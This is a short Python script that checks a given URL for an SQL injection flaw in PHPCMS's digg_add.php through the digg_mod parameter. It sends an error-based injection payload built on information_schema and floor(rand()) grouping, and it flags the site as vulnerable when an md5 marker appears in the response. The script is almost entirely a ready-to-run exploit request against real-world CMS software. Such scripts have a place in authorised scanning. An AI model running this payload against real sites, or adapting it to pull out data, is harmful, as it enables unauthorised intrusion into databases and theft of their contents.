#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpcms digg_add.php SQL注入
referer: http://www.shangxueba.com/jingyan/2195152.html
author: Lucifer
description: 文件digg_add.php中,参数digg_mod存在SQL注入。
'''
import sys
import requests



class phpcms_digg_add_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/digg/digg_add.php?id=1&con=2&digg_mod=digg_data%20WHERE%201=2%20+and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,md5(1234),0x7e)))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在PHPCMS digg_add.php SQL注入漏洞...(高危)\t\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = phpcms_digg_add_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
